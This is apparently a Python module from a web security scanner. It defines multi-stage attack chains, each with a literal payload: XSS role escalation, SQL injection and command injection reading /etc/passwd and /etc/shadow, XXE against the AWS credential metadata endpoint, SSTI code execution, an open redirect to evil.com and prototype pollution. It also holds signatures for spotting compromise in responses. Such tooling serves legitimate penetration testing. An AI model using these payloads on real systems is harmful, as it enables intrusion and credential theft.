"""Multi-stage payload chaining — combine attack types for greater impact."""

from __future__ import annotations

from basilisk.models import Finding
from basilisk.scoring import score_finding


CHAIN_TEMPLATES: list[dict] = [
    {
        "name": "XSS -> CSRF -> Privilege Escalation",
        "stages": ["xss", "csrf", "privilege_escalation"],
        "description": "Use XSS to execute CSRF on admin panel, escalating privileges.",
        "payload": "<script>fetch('/api/admin/change_role?role=admin',{credentials:'include'})</script>",
    },
    {
        "name": "SQLi -> File Read -> Lateral Movement",
        "stages": ["sqli", "lfi", "ssrf"],
        "description": "Extract DB credentials via SQLi, use for LFI, pivot via SSRF.",
        "payload": "' UNION LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/out'--",
    },
    {
        "name": "SSRF -> Internal Service -> RCE",
        "stages": ["ssrf", "cmdi"],
        "description": "Use SSRF to access internal admin interface, inject command execution.",
        "payload": "http://localhost:8080/admin?cmd=;cat+/etc/shadow",
    },
    {
        "name": "Open Redirect -> Phishing -> Credential Theft",
        "stages": ["open_redirect", "credential_stuffing"],
        "description": "Open redirect leads to phishing page that steals credentials.",
        "payload": "/redirect?url=http://evil.com/login",
    },
    {
        "name": "XXE -> SSRF -> Cloud Metadata",
        "stages": ["xxe", "ssrf_oob"],
        "description": "XXE reads cloud metadata endpoint for AWS IAM credentials.",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/">]><foo>&xxe;</foo>',
    },
    {
        "name": "SSTI -> RCE -> Container Escape",
        "stages": ["ssti", "cmdi", "container_escape"],
        "description": "Server-side template injection leads to RCE, used to escape container.",
        "payload": "{{config.__class__.__init__.__globals__['os'].popen('cat /proc/1/cgroup').read()}}",
    },
    {
        "name": "Prototype Pollution -> DOM XSS",
        "stages": ["prototype_pollution", "dom_xss"],
        "description": "Pollute Object.prototype to inject payload that triggers DOM XSS.",
        "payload": '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
    },
]

CHAIN_END_SIGNATURES = {
    "rce": ["uid=", "www-data", "root:", "linux", "Microsoft Windows"],
    "file_read": ["root:x:", "daemon:x:", "[extensions]", "<?php"],
    "credential_leak": ["password", "secret", "api_key", "token", "jwt"],
    "cloud_metadata": ["ami-id", "instance-id", "iam", "security-credentials"],
    "internal_access": ["dashboard", "admin", "internal", "grafana", "kibana"],
}


def detect_chain_success(
    responses: list[dict],
    chain_info: dict,
    target: str = "",
) -> Finding | None:
    if not responses:
        return None

    final_response = responses[-1]
    body = final_response.get("body", "")
    status = final_response.get("status_code", 0)
    lower_body = body.lower()

    for category, sigs in CHAIN_END_SIGNATURES.items():
        for sig in sigs:
            if sig in lower_body:
                cvss, vector = score_finding("payload_chain")
                return Finding(
                    vulnerability=f"Payload Chain: {chain_info['name']}",
                    severity="Critical",
                    description=(
                        f"Multi-stage attack chain '{chain_info['name']}' succeeded. "
                        f"Final stage indicator: '{sig}' ({category}). "
                        f"Stages: {' -> '.join(chain_info['stages'])}"
                    ),
                    target=target,
                    attack_type="payload_chain",
                    payload=chain_info.get("payload", "")[:100],
                    cvss_score=cvss,
                    cvss_vector=vector,
                    confidence=0.8,
                    remediation="Implement defense-in-depth. Each vulnerability class should be mitigated independently.",
                )

    if status in (200, 201, 202) and len(body) > 100:
        cvss, vector = score_finding("payload_chain")
        return Finding(
            vulnerability=f"Payload Chain Partial Success: {chain_info['name']}",
            severity="High",
            description=f"Chain completed with HTTP {status} and {len(body)} bytes response. Chain: {' -> '.join(chain_info['stages'])}.",
            target=target,
            attack_type="payload_chain",
            payload=chain_info.get("payload", "")[:100],
            cvss_score=cvss,
            cvss_vector=vector,
            confidence=0.5,
        )

    return None


def get_chains() -> list[dict]:
    return list(CHAIN_TEMPLATES)
